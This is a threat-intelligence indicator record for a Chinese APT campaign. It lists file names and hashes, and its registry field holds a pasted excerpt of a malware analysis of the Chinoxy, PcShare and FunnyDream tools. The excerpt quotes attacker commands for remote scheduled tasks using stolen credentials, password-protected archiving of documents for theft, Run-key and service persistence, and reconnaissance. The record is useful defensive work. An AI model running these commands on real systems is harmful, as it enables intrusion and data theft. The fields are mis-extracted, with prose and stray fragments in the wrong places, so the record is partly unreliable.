{"rule_id": 207, "name": "Bitdefender-Whitepaper-Chinese-APT", "description": "-", "references": [], "File_Names": ["wuaueng.dll", "ccf32.exe", "unio.exe", "tcp_transfer.pdb", "vssvb.exe", "iat.exe", "eoffice.exe", "filepak.pdb", "thread.The", "wp_clt.pdb", "conhosts.exe", "UniKeyTN.exe", "_sts.tmp", "orign.dll", "md_client.pdb", "ipconfig.exe", "Q7RK1util.exe", "rdpclip.exe", "bit.exe", "BDPTSutil.exe", "y54947.exe", "wuauong.tlb", "U8VCQutil.exe", "StringDll.ini", "I7YaOutil.exe", "BkavSystemServer.exe", "k1.ini", "SearchIndexer.exe", "tbp_clt.pdb", "ft.data", "11.bat", "BkavUtil.exe", "tbp_clt21.exe", "Dll_deploy.pdb", "systeminfo.exe", "Bka.exe", "bitupdating.exe", "opendns.com", "sc.exe", "wmihelp.dll", "wmiutil.dll", "the.data", "rtlmake.dll", "filepak.exe", "wuauclt.exe", "googleupdat.exe", "tcp_transfer.exe", "M93732.exe", "tcp_bridge_clt.exe", "LBTWizGi.exe", "ws2008update.com", "eofficeupdate.com", "Y7KFPutil.exe", "ccf64.exe", "Gdiplus.dll", "iexeplorer.exe", "x4984.exe", "threatintelligence.html", "msvcrt.dll", "tk.tmp", "_mda.tmp", "unikeytn.exe", "wininstall.pdb", "winmsg.dll", "H7kSFutil.exe", "winuser.dll", "winscr.dll", "asf32.exe", "ws.tmp", "n7mj7util.exe", "initialization.bat", "logagent.exe", "rtlmain.dll", "cutil.exe", "7zr.exe"], "MD5_Hashes": ["ad5a170f3ec0a4a152da0f920c9e3c0f", "50c0f86e28268d07c1815552962a91ad", "10f9a1578b3f80b7413bf20b56541c86", "1afff5b9026bdf27a0c111b50d28ae92", "362b1114f32b980443957079bac6d01e", "8a278b97b8d33990d361149ee9921f9a", "cd4ddac604e440197fb6838cc1fca313", "ff992b4aa59884ad153c887fbb7155fc", "132227d867e63f8bce24ae5741791d7a", "470bcfdf9e7aad3831d84a04d75337ab", "3db71a32bebe09bf25442766ceca5ddc", "5c6575a1c2152b5eb161c670db124b4a", "88e486dc8f876359617870c999d9b1d2", "e2d5565c2d5b5621b2272ea01e3a18d6", "550bf8d1eb81a1a9d4a1e17b6be7d89c", "d3a6653b748eb5ff467149c9150762a1", "b190911ebc6cce700f02bc90a3294fd2"], "SHA1_Hashes": [], "SHA256_Hashes": ["145ec6dac68fe28857220db70575c5f97540c901509e1b009ecb7857047d0bfd", "8d3b5825690d4f893cc577b22cbe3c12232b9895c9a0417b750ba722e8851d6d", "26afbe3cab4967cb48ada596959ef77367da9cb194c71db77ebe1fcbe7aabf6f", "139d4c31f1dfd17b74506931622d12c537d597c85e52a58065cf3a917b469aea", "915af21d627f5bec059800bb9740a228e93fae8dd4fd574bd4d2812c7d6adf8d", "91dfbee660be3d11f8a631b4bbf552d0ee60ec908f4d0817643d591726d53bfd", "7ecba3270ff06c5d618a78c4e471f457e8672211bb8cdd4aa58b6516ea5fe603", "e97ac9089fa80dc38e8fe920008c117d93203e45a1516d24b59f17f7055b8ced", "455d890479f1137797bfb32e6f5f1a4634a69c11654bb5ec0b6710a25418a12e", "47519ef2e613fd17b18e885bb09cfa1e047feaa86d6d16d3916d14c3b244c533", "aaf9ce055918b0092bba7db26816237170870601614155defe143986b5dac8fe", "1aa170383d473b6adb16032942b34eb136dd013ea8e2f5cc8fec7356a92191b3", "05f9a809a6800112fa1e02975489974d003d55810a4cfb11a0705e8a427ea734", "0f5cac319750d37eb6a7d38c1deec7d5839c642287b48b0fb8a1921185b521f1", "5e90afbdfb63110fa3c9cdd79ef474852996a895a6bad66a663e2ccc51dd339b", "a224ab4d8ca5ed62755b1b7f36ce6c80e89a684d1e792400d8fa889b1860fcc6", "631c62e067667a02da63a97aeeb556bece8394deee59e62b48f63baecf4cf613", "409e95e0824c4e80450196dbde2e64a2424d3e724760e471c1e68d3fb67dec24", "9a63d810f69eb35ee8ee3797bd1574e08b67f31c0e368bf9cf01202f5f73c664", "682df3d96cf40a24637905d9ab7a62e3dd0777a1320b078bc89951076f842744", "28570122e952f25c92dfb83707c502a5036b9f99770127435cbb8c7e6796cce4", "a276a0e01b5024f46ef1a05a5e9810c39b8757a0cea665519bf619bf35604008", "2e6dfca6b2b8a11d6eb8933bd7ed7f17ca46499a3ee548bbb086406eb57b2204", "a78dace0fd8c043016406f99f0103cd7ebee67e21261c0097efe6072bfc680b0", "85bd4f36c20222d1e0a1908bb2befd9a19d9e476ef8fdffa8c7b2f14ec22ce01", "e5365d81ee31e9b86ea14e1ee7abf0809337f3bc9e7b00d7492c2caed4ca5f36", "4caab78b44c288406b3d66feab853a399c72b237e244993434dd6206013cc371", "f7356689c3c4caca57d7edd4a45ac3a2cfa672ccf444e80a69fd271210d320f3", "f976a52f2d82e608f95e95d41e2eacad58e19a9e9cb92f061090d72fd2703413", "63e8488de30c9b615c76d4e568f0a1b738fcad665e58571c299d8e9d7752a637", "c01110788b9345b5564c1b5b0876a27e1b2501b19b90280054026e89f68a4f48", "2bf0b8453c5f5a3f616894d72acb61868bb6c75403891411a123eceb6d0f9f9b", "c41fa483bd7e186d754d592405d4649adcb78192b3a66586e526ecb6be0f17b5", "942e810563d142c949215dbe38562f1ffb31d4b9afc8a98047d97ed2e7ece478", "1cd8b6f1e2d49e6605f5ae695ea126eee8c82264a9644758126a4c30662ce9d5", "9670563876caa2587d4001d3cbda11a4ca4601fd9f0555ec9468f4796fce7ae6", "5648ba8ba4d1dd623f82fb9adebcf87085a8a619147e7979ea08f763ab69b0cb", "70891a33bcd94e40cdbb0660b983dd7dc439005b2cae614c7b7504fd24eb8696", "f262662bd9c78137837e5943f891da3b520095668c0592bc11c0dc742db0640a", "f6f9d0620db35c1f6a3fad9c9bc6d7aaf6594355b606bce2b9513aa721679d95", "74b8030c67320030998e8f58da4a6215dd4cc4c0aef7863c5fc8a1985cbf22a4", "69c1f791402e36a360a901e3e42c177b02281a84c275a228b00b86596636fa95", "9a3829bd0a4dd7b72c54d1aed972f91aede57357d7a9dcd3d9f8b8d192189a03", "25ce8296bc4da119093d847afc18ee030a4c94a39066732227a73f8908c40292", "7d92c7bc22dc95526a0c8713211b9bcfe85cac2c4a760067e69992afa19efbe5", "2d20fc0fd6ef07c367761abe97762f044e90e428addd9a9af7b6cf88087d455b", "780739a25d90fd850e82792d59de4c04530337e79cd4b7a3149f229b75a7d5ce", "ba3d8ff9b3f6b6223dd33dee15321e267cc28627723e68cd632e59d85c529330", "0a2a047c2b670f7da11a7d72e2ab3b867eebb6ccbe3ccad92817a6e74ac343a2", "e61649ac70198e223c123ad29c7d02ebe4fe6da7f35282d26bd93d466e85176d", "311f3011172618c95fcf339ac3ddce10c415c95215eb6cea60d5eb9b00a5de51", "7b524c3bdd5d5474b6e050084e3f32d2bf7f5c4539b44221e4bc2987b2deb56d", "f3b16798054a4510650682e17ae5bc12d27b460eac8314318eeda5e0488869dc", "8c49d7f83af949f4145d5da32c308ef98ebfc5fce030a405bf2b6855a8a0575e", "58f88767a4599a95f29048852f92afe52a32b646ffdd50291cd1be5a97ebe7ea", "46e1381c0228502276f1eb3b755f9f34f6a6d4ffbbecc95bde852ddf40e09ad8", "6f7f142089b1d2e48880f59362c7c50e5d193166bdd5e4b27318133e8fe27b2c", "8ff4979b40ffcef7eedcfeb6fb4fecb42aceb53bc816dc4d36428e12ad67d051", "f76847bed642a92d3a5fac4782d0ae2a140203579f43f7b3c8db4090853986ad", "2fdc7963612be26b8c13ed59572bd2785c1d11da15494c34a0f1632530fddf64", "80a1fd088d0153a0c33fd606660f9d8e82349cdb6fade850cc06e07fe6732d4b", "aefe49a247322d3bbefc9e29d30c809499518b947a88d0c2ac9e11cf735b1544", "32cabf2952f88283251c36751e04a45bfa78cdb0835460619d4812b882795c03"], "Registry_Entries": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry \nkey the path to the unio.exe under the \u201cUNI\u201d key value. This is not the only persistence used, some of the Chinoxy \ndroppers, in particular the 1afff5b9026bdf27a0c111b50d28ae92 sample, was located in the startup folder (%COMMON_\nSTARTUP%\\\\eoffice.exe).\n\nIn the context of the current attack, the Chinoxy backdoor was mainly used to execute ccf32.exe for data collection. \nThe attackers copied ccf32.exe to \\\\<remote_host>\\C$\\Users\\Public\\folder, along with a bat file (e.g.\\\\<remote_\nhost>\\C$\\Users\\Public\\11.bat), then executed the bat daily, using schtasks.exe:\n\n\uf09f\t schtasks  /create /s <remote_host> /u \u201c<username>\u201d /p \u201c<password>\u201d /ru \u201cSYSTEM\u201d /tn one /sc DAILY /tr \u201cc:\\\n\nusers\\public\\11.bat\u201d /F\n\nThe bat file will execute ccf32.exe.\n\nPcShare\n\nDuring the investigation, we noticed files with names like \u201cbitupdating.exe\u201d, \u201ciat.exe\u201d and \u201cbit.exe\u201d on some victims\u2019 \nmachines. At that moment, we had already encountered many FunnyDream samples that communicated with such \ndomains as\u201ceofficeupdate[.]com\u201d and \u201cwmiprvse[.]com\u201d. These domains were known to be connected to \u201cbitupdating[.]\ncom\u201d and \u201ciatupdate[.]com\u201d via the IP addresses to which they resolved and the email used for registration. Moreover, \nafter having analyzed the binaries named\u201cbitupdating.exe\u201d and \u201ciat.exe\u201d, we identified that they are PcShare droppers \nand their C&C domain was reflected in the file names (\u201cbitupdating[.]com\u201d and \u201ciatupdate[.]com\u201d, respectively).  \nInvestigating the Root Cause Analysis for PcShare process, we saw that it was actually executed by the Chinoxy \nbackdoor.\n\nThe attackers used a slightly modified version of PcShare that is available on GitHub, in addition to the Chinoxy \nbackdoor. The installation of the PcShare payload (PcMain) is presented in Figure 3:\n\nFig.3: The installation of PcMain\n\n6\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nPcShareDropper\nAll samples of droppers are executable files with the \u201cwuauclt.exe\u201d InternalName, as well as many other version info \nfields filled. Besides, there is an invalid certificate in the overlay of each executable. All this suggests that the binaries \npretend to be legitimate \u201cWindows Update AutoUpdate Client\u201d.\n\nOnce executed, the dropper starts its activity by obtaining the addresses of the winapi functions used. After that, it runs \nthe \u201cmain\u201d function in a separated thread. Some interesting aspects are worth mentioning:\n\n\uf09f\t The dropper contains the x86 and the x64 versions of the PcShare Loader and, depending on the infrastructure \n\non which it was executed, it drops one version or the other.\n\n\uf09f\t Both of these versions are in the.data section, XOR-ed with different 32-long base16 strings and compressed \n\nwithLZW algorithm.\n\n\uf09f\t The dropper creates the%LOCALAPPDATA%\\microsoft\\windows\\explorer\\update folder, drops the PcShare \n\nLoader in the %TEMP% folder with the name \u201c<random decimal int>_sts.tmp\u201d and, then moves this file into the \nfolder created earlier, naming it \u201cwuauong.tlb\u201d.\n\n\uf09f\t Afterwards, theHKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\\n\nInprocServer32registry key is created by the dropper. The default value of that key has the path to the\u201cwuauong.\ntlb\u201d file assigned to it. The other key value named \u201cThreadingModel\u201d gets created, and is assigned the \u201cApartment\u201d \nstring. This marks the completion of the persistence setup. The {42aedc87-2188-41fd-b9a3-0c966feabec1} \nCLSID corresponds to the MRUPIDLList COM object (The Most Recent Used PIDL List) exported by shell32.dll. The \nexplorer.exe usually uses that COM object, and, therefore it implicitly loads the correspondent InProcServer32 \nDLL. However, the functionality exported by this COM object is not critical for the system, thus, it can be \nremoved or disabled.\n\nUltimately, the rundll32.exe executable is being run (which, in its turn, calls cmsot function exported by wuauong.tlb) \nand a process running explorer.exe is being run with the same attributes as the existing one in order to trigger the \npersistence.\n\nPcShareLoader\nThe role of the loader is to inject the PcMain payload into the logagent.exe process. This is done probably for defense \nevasion, as logagent.exe is known to create traffic to send log errors from Windows Media Player.\n\nThe loader is a DLL file with the \u201cwuaueng.dll\u201d InternalName and the \u201crtlmake.dll\u201d ExportName which, besides the \nDllMain function, also exports two other functions: cmsot and Embedding. In the overlay part of the binary, it has \na certificate which, in combination with the VERSIONINFO fields, should impersonate a module belonging to the \n\u201cMicrosoft Windows Update\u201d, just like its dropper does.\n\nRegarding the behavior implemented into the loader, the following should be mentioned:\n\n\uf09f\t The cmsot function is responsible for deleting the file received as the parameter. The file is renamed \u201c<random \n\ndecimal int>_mda.tmp\u201d, moved into the %TEMP% folder and, then deleted. The dropper usually calls this \nfunction in order to delete itself from the disk;\n\n\uf09f\t The DllMain function checks whether the name of the executable in which the respective DLL is being loaded \n\nis \u201cexplorer.exe\u201d. If it is, the Embedding function is called;\n\n\uf09f\t Embedding is the \u201cmain\u201d function of the loader;\n\nThe Embedding function makes sure that only a single instance of the loader exists in memory (using \nCreateFileMappingW and OpenFileMappingW). It decrypts and decompresses the structure called PSDLLINFO \n(which contains useful information for PcMain like the IP address and port of the C&C) and decrypts the \nPcMain payload itself. Both the structure and the payload are in 2 global variables, XOR-ed with the strings \n\u201c2ae06f136eb6588508eefd4b5f6c98d8345f1104746d15141\u201d and \u201c5c6575a1c2152b5eb161c670db124b4a\u201d \nrespectively (those keys are used in all samples of PcShare Loader we were able to find related to the attack). \nAfter obtaining the payload and the PSDLLINFO structure, it maps them into the newly created logagent.exe (using \nVirtualAllocEx/WriteProcessMemory). Then, using CreateRemoteThread, the Putklm function exported by the payload \nis executed.\n\n7\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nLooking for similar files in our collection, we found more samples of PcShare loader, some of those \nsamples inject their payload into \u201crdpclip.exe\u201d and have C&C that seem unrelated to the current attack (e.g.  \n550bf8d1eb81a1a9d4a1e17b6be7d89c with C&C supports.casacam[.]net).\n\nPcMain\nAll samples of PcMain extracted from loaders we found related to the attack are injected into logagent.exe and have \nExternal Name as \u201crtlmain.dll\u201d. Another common characteristic of those samples is that they export Putklm function, \nwhich is responsible for reflective loading. \n\nOnce the reflective loading is done, the PcMain obtains the PSDLLINFO structure mapped into the logagent.exe \nmemory, and it continues with the decryption of the string collection by applying a XOR operation and a decompression \nusing LZM algorithm (custom implemented). The string collection contains winapi function names and the DLL \nnames that export those functions, as well as format strings, file paths, registry key names and many other strings as \npresented in the figure below:\n\nFig. 4 - A part of string collection - similar with StringDll.ini from Github Code\n\nFrom this point, the code is pretty similar with that found on Github, with some minor modifications:\n\n\uf09f\t The single instance of the payload is assured by using OpenFileMappingA/CreateFileMappingA functions.\n\uf09f\t All processes of logagent.exe are killed except the one in which PcMain is injected\n\uf09f\t The module obtains the proxy settings using InternetQueryOptionA and, if a proxy exists, a socket connection \nto it is initiated by sending an http request from the following template \u201cCONNECT <host>:<port> HTTP/1.1\\\nnUser-Agent: Mozilla/v5.0\\nHOST: <host>\\nProxy-Connection: Keep-Alive\\n\\n\u201d. As the host the C&C address is \nset.\n\n8\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nThere are implemented only a subset of modules that are present in the Github code:\n\nm_Command\n\nFunction name\n\nDescription\n\nWM_CONNECT_FRAM SSH_FramThread\n\nWM_CONNECT_FILE\n\nSSH_ MainThread\n\nWM_CONNECT_PROC \n\nWM_CONNECT_SERV \n\nWM_CONNECT_REGT \n\nWM_CONNECT_FIND \n\nWM_CONNECT_TLNT\n\nSSH _TlntThread\n\nWM_CONNECT_DL_\nFILE\n\nSSH_DlThread\n\nWM_CONNECT_TURL\n\nSSH_TuRlThread\n\nWM_CONNECT_UPLO\n\nSSH_FileThread\n\nRemote control component; Sends \nscreenshots and receives events like Mouse \nEvents, Keystroke events\n\nCommand loop for file, process, registry \nmanipulations\n\nExecutes cmd commands by connecting \nthe stdin and stdout/stderr to the C&C; \nImplements a custom command \u201cgetip\u201d \nby running \u201cnslookup myip.opendns.com \nresolver1.opendns.com\\r\\n\u201d\n\nUploads files to the C&C in a loop; the file \npaths are received from C&C\n\nReceives urls for downloading files; \nDownloads and executes the files\n\nReceives a file from C&C, writes it to disk and \nexecutes it\n\nWM_CONNECT_UP_\nFILE\n\nSSH_UpThread\n\nReceives a file from C&C and writes it to disk\n\nWM_CONNECT_MESS\n\nSSH_MessThread\n\nShow a message using MessageBox\n\nWM_CONNECT_LINK\n\nSSH_LinkThread\n\nOpen a link with iexeplorer.exe\n\nWM_CONNECT_VIDEO SSH_VideoThread\n\nCapture camera video and send to C&C; \nmodule seems to be broken (call to \nInitStillGraph is missing)\n\nDelete the persistence from registry and \nwuauong.tlb\n\n-\n\nCLIENT_PRO_\nUNINSTALL\n\nCLIENT_SYSTEM_\nRESTART\n\nCLIENT_SYSTEM_\nSHUTDOWN\n\nShutDownSystem\n\nRestarts the system\n\nShutDownSystem\n\nShutdown the system\n\nThe PcMain is capable of updating itself and its PSDLLINFO which contains C&C address. \n\n9\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nCcf32\n\nThe ccf32.exe binary (362b1114f32b980443957079bac6d01e) is a command line tool used for data collection. \nAlthough this tool embeds more options the attackers could use, we have seen only one intensively used, the \u201c-PC\u201d \noption:\n\n\u201cccf32.exe  -PC all 123456 doc,docx,ppt,pptx,xls,xlsx,pdf 1903220000 1904221000\u201d.\n\nThe \u201c-PC\u201d option accepts six parameters, the flag itself followed by:\n\n\uf09f\t the target folder for listing\n\uf09f\t the archive password (the archive will contain the collected files)\n\uf09f\t file extensions which attackers are interested in\n\uf09f\t two timestamps whose meaning will be explained below.\n\nIn the case of the previous option, the ccf32 initiates a file listing of all drives if the \u201call\u201d string is specified, or it lists the \ngiven as parameter folder. Throughout the listing, the LastWriteTime attribute of each file is transformed into an integer \nusing _wtoi and a string obtained as follow:\n\nFig. 5 \u2013 LastWriteTime to string transformation\n\nIf the resulted integer is contained in the range given by the two timestamps from the command line (which respect \nthe same format as the resulted integer), this means that the correspondent file passes the \u201cfilter\u201d.  All the file paths \ndiscovered during the listing process are written into a text file called \u201ctemp\u201d (located in the same folder as ccf32). The \n\u201ctemp\u201d file is parsed to obtain the list of files that have the targeted extensions (those from the command line). \n\nThe ccf32 creates a hidden directory in the current location, naming it after the current local time by using the year, \nmonth and day (eg. \u201c2019.01.29\u201d -> \u201c20190129\u201d). In that folder, ccf32 temporarily stores the files that it intends to \ncollect. \n\nAfter that, all files are copied to the temporary hidden folder, ccf32 drops in the current directory a 7zr.exe executable \nwhich is contained in the ccf32 binary as a buffer XOR-ed with \u201c0x41\u201d byte. The 7zr.exe is used for adding the collected \nfiles to an archive called \u201cpath.7z\u201d, and is being executed using cmd.exe:\n\n\u201cC:\\Windows\\system32\\cmd.exe/c c:\\users\\public\\7zr.exe a -bso0 -bse2 -bsp2 -p<password_\nfrom_comamnd_line> c:\\users\\public\\path.7z c:\\users\\public\\20190423\\\u201d\n\nIf the compression is successful, then the ccf32 starts the cleanup process by deleting the \u201ctemp\u201d file and the hidden \nfolder.\n\n10\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nThe ccf32.exe life cycle in this attack can be described as follows:\n\nPhase\n\ncommands\n\ndeployment\n\n\\\\<remote_host>\\C$\\Users\\Public\\<bat_name>.bat  \uf0e0 C:\\Users\\Public\\<bat_\nname>.bat\n\n\\\\<remote_host>\\C$\\Users\\Public\\ccf32.exe\uf0e0 C:\\Users\\Public\\ccf32.exe\n\nschtasks  /create /s <target_host> /u \u201c<username>\u201d /p \u201c<password>\u201d /ru \u201cSYSTEM\u201d /\ntn one /sc DAILY /tr \u201cc:\\users\\public\\ \\<bat_name>.bat \u201c /F\n\ncollection\n\nxcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_\nhost>.7z /H /Y\n\ncleanup\n\ncmd.exe /c del \\\\<target_host>\\c$\\users\\public\\path.7z /A:H \n\ncmd.exe /c schtasks /delete /s <target_host> /u <user> /p <password> /tn one /f \n\ncmd.exe /c del \\\\<target_host>\\c$\\users\\public\\<bat_name>.bat  && del \\\\<target_\nhost>\\c$\\users\\public\\ccf32.exe\n\nAlthough we have seen only the \u201c-PC\u201d option used, the ccf32.exe has more capabilities, like uploading the results to an \nftp server specifying the user, password and the server address to command line.\n\nThere is also a x64 version of this tool, named ccf64.exe (50c0f86e28268d07c1815552962a91ad).\n\nFunnyDream toolset\n\nBy tracing the parents of ccf32.exe, besides the Chinoxy, we noticed the usage of a new backdoor, which we identified \nas FunnyDream backdoor. The highlighted fact revealed the existence of a much more complex toolset that we intend \nto describe in the following sections.\n\nFunnyDream\n\nThe attackers used the backdoor prevalently as DLL files, but we observed an executable to be used as well. The files \nwe found implement many persistence mechanisms, their droppers and loaders use many different file names for the \npayload, all of that suggesting that the backdoor is custom made.\n\nFunnyDreamDropper\nMost of the droppers of the FunnyDream have the pdb path set to \u201dC:\\works\\prjs\\z3_build\\build\\DllBuilder\\Release\\\nDll_deploy.pdb\u201d. There are also samples with \u201cE:\\Works\\Zu3\\Project\\build\\DllBuilder\\Release\\Dll_deploy.pdb\u201d,\u201cE:\\\nWorks\\Zu3\\Project\\build\\gen17\\bin\\wininstall.pdb\u201d pdbs. Moreover, the pdb path of some samples reflects the \npersistence that the dropper installs (e.g.E:\\Works\\Zu3\\Project\\build\\gen17_link_dll\\bin\\wininstall.pdb, E:\\Works\\\nZu3\\Project\\build\\gen17_reg_exe_HKLM\\bin\\wininstall.pdb). In the case of droppers that deal with persistence, the \n\n11\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nmechanisms used are the Run registry key and the Startup folder, this being done using com objects identified with \nCLSID_ShellLink(IShellLink and IPersistFile) and WScript.Shell(RegWrite method).\n\nThe dropper contains a resource named \u201cBIN\u201d containing the backdoor in the form of a template binary (usually \nunencrypted) that sometimes is customized before dropping by replacing the string \u201cfunnydream\u201d with a file \npath that will be deleted after the backdoor is loaded or by adding to the string \u201cprettygirl\u201d the C&C address \nencoded using base64 with \u201cxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-\u201d or \n\u201cxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=\u201d charsets.\n\nOne representative dropper (10f9a1578b3f80b7413bf20b56541c86) revealed some of the methods used by the \nattackers and showed how deeply they are infiltrated into the victims\u2019 network.\n\n10f9a1578b3f80b7413bf20b56541c86\n\nThis sample we found to be located at \u201c%USERS%\\public\\libraries\\msvcrt.dll\u201d, but on many machines it was executed \nfrom the \u201cnetlogon\u201d shared folder.  Using WMI (windows management instrumentation), the attackers executedthe \n\u201ccmd.exe /c \\\\<DC host>\\netlogon\\initialization.bat\u201d command on the remote machine. The initialization.bat starts \nthe dropper by running \u201crundll32 \\\\<DC host>\\netlogon\\msvcrt.dll,Start\u201d. \n\nThat trace, besides being more evidence of lateral movement, proves that the attackers already infected some domain \ncontrollers from the victim\u2019s network.\n\nThis sample also creates in %APPDATA% a folder called \u201cmaxbear\u201d and it drops the FunnyDreambackdoor binary \nfrom the \u201cBIN\u201d resourceto a file with randomized name using the format string \u201c%s\\\\maxbear\\\\%c%c%c%c%cutil.exe\u201d, \nsimilar to those presented below:\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\U8VCQutil.exe \n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\BDPTSutil.exe\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\H7kSFutil.exe  \n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\I7YaOutil.exe \n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Y7KFPutil.exe \n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Q7RK1util.exe\n\nUltimately, the dropper executes the FunnyDream binary by invoking the \u201cStart\u201d function exported by the payload using \nrundll32.exe.\n\nFunnyDream backdoor\nThis component has multiple capabilities, such as gathering user information and sending it to the command and \ncontrol server, cleaning traces of malware deployment, detection evasion and, of course, backdoor behavior (executing \ncommands and sending the results to the C&C server).\n\nThis backdoor is used by attackers to run other tools (like ccf32.exe) to exfiltrate intelligence. It appears under \na vast variety of names, being deployed by a dropper or manually by the attackers. A good example is the \n3db71a32bebe09bf25442766ceca5ddc sample, which we have seen to be deployed by a dropper as C:\\Users\\<user>\\\nappdata\\roaming\\maxbear\\n7mj7util.exe, but also, we encountered it as a local %USERS%\\public\\libraries\\msvcrt.\ndll file. In some cases, this sample was executed from netlogon share as \\\\<DC>\\netlogon\\msvcrt.dll exactly like the \ndropper described previously. \n\n12\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nOther paths of the FunnyDream binaries related to the attack are:\n\n%PUBLIC%\\libraries\\winmsg.dll\n\n%COMMON_APPDATA%\\microsoft\\netframework\\winmsg.dll\n\n%PUBLIC%\\bin\\winmsg.dll\n\n%PUBLIC%\\libraries\\winuser.dll\n\n%COMMON_APPDATA%\\wmiutil.dll\n\n%PUBLIC%\\libraries\\wmihelp.dll\n\nC:\\Users\\<user>\\appdata\\local\\temp\\unikeytn.exe\n\n%COMMON_APPDATA%\\microsoft\\netframework\\vssvb.exe\n\n%COMMON_APPDATA%\\conhosts.exe\n\n%PUBLIC%\\libraries\\conhosts.exe\n\nThe paths presented above correspond to binaries that are deployed manually. For some of them, we have evidence \nthat they are deployed using a bat file via WMI. Moreover, that bat file installs the persistence for the deployed \nbackdoor (usually by using reg.exe for writing to Run keyor using sc.exe):\n\n\uf09f\t reg  add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v unikey /t REG_SZ /d \u201cC:\\users\\<user>\\\n\nappdata\\local\\temp\\UniKeyTN.exe\u201d\n\n\uf09f\t sc  create \u201cOffice Update\u201d binpath= \u201ccmd /c start /b C:\\ProgramData\\Microsoft\\NetFramework\\vssvb.exe\u201d \n\nstart= auto\n\nC&C communication\nCommunication with the C&C server starts by obtaining the address. Usually it is in plain text, but there are also cases \nwhere they are base64 encoded with a custom charsetorXor-ed as shown in the image:\n\nFig. 6 \u2013 C&C address deobfuscation\n\nSome samples, after obtaining the address, initiate a TCP connection directly to the C&C server, but there are binaries \nwith a more complex logic, like the ones below:\n\nb190911ebc6cce700f02bc90a3294fd2\n\nIt starts by looking into Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings registry corresponding to each \nuser for extracting the \u201cProxyServer\u201d string. Then, it parses the string to find a http proxy and, if that exists, it tries to \ninitiate a connection by sending a packet using a TCP connection to that proxy:\n\n\uf09f\t \u201cCONNECT <proxy_addr>:<proxy_port> HTTP/1.0\\r\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; \nWindows NT 6.1;)\\r\\nProxy-Connection: Keep-Alive\\r\\nContent-Length: 0\\r\\nHost: <destination>\\r\\\nnPragma: no-cache\\r\\n\\r\\n\u201d\n\nThe expected value received from the proxy is \u201c200 Connection established\\r\\n\u201d which suggests that a connection is \nestablished.\n\nIf a proxy is not set at all, the binary uses a raw TCP to transmit its packets.\n\n13\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nThe payload of a packet is transformed by XOR-ingit with a random value and compressing it with zLibalgorithm. The \nresulted buffer is set as body for an http packet formed from the next template:              \n\nFig. 7 \u2013 HTTP request template\n\nThe Host header is assigned the C&C address and the POST path is formed as follows:\n\n/<seconds>/<random>/<incremental value module 1000>/<day>/<month>/<hour>/<minute>.\n\nad5a170f3ec0a4a152da0f920c9e3c0f\n\nThis sample, like the previous one, obtains the proxy by looking into the registry, but it searches for a socks proxy. \nIf such exists, it initiates a TCP connection to the proxy server and sends a 13-byte message corresponding to the \nfollowing \u201cVER=0x4\u201d, \u201cCMD=0x1\u201d, \u201cDSTPORT\u201d, \u201cDSTIP\u201d \u201cID=\u2019htun\u201d packet which should create a tunnel to the C&C \nthrough the proxy.\n\nThe payload of a packet is compressed in the same way as b190911ebc6cce700f02bc90a3294fd2 does, the \ndifference appears in the http packet template, in which the obfuscated payload is embedded:\n\nFig. 8 \u2013 HTTP replay template\n\nThe http packet corresponds to an HTTP replay and the \u201c%s\u201d parameter is filled with the \u201cDate\u201d header option assigning \nto it the current time in the \u201c%a, %d %b %Y %H:%M:%S GMT\u201d format (e.g. \u201cDate: Tue, 15 Nov 1994 08:12:31 GMT\u201d)\n\nBackdoor Capabilities\nAs stated above, the backdoor tries to delete a file whose file path replaced the \u201cfunnydream\u201d string from the template. \nUsually the deleted file is the dropper component.\n\nThe second action some executables take is to run the \u201cwhoami/upn&whoami/fqdn&whoami/logonid&whoami/all\u201d, \nwhich extracts much user information from the system, and to send the output to the C&C.\n\nAnother distinct characteristic of some samples is that they check for the existence of \u201cBka.exe\u201d or \u201cBkavUtil.exe\u201d \nprocesses. If such a process exists, then the backdoor, in a separated thread, enumerates the system windows using \nEnumWindows function. The WNDENUMPROC callback function used for enumeration searches for a specific visible \nwindow that has the window text set to \u201cOK\u201d and it belongs to the \u201cBkavSystemServer.exe\u201d process. To that window \na \u201cBM_CLICK\u201d message is sent. The backdoor capabilities are implemented in two classes called CShellManager and \nCFileManager. \n\nThe CShellManager class is responsible for creating a cmd.exe process and for connecting the stdin/stdout/stderr of \nthat process to the C&C to receive commands and send back the output of those commands. \n\n14\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nThe CFileManager implements operations like file upload, file download, directory listing, file and directory removal/\nmovement and, of course, the file execution operation (using ShellExecuteA or CreateProcessA).\n\nFilepak\n\nThe Filepak component is used for file collection, being deployed in 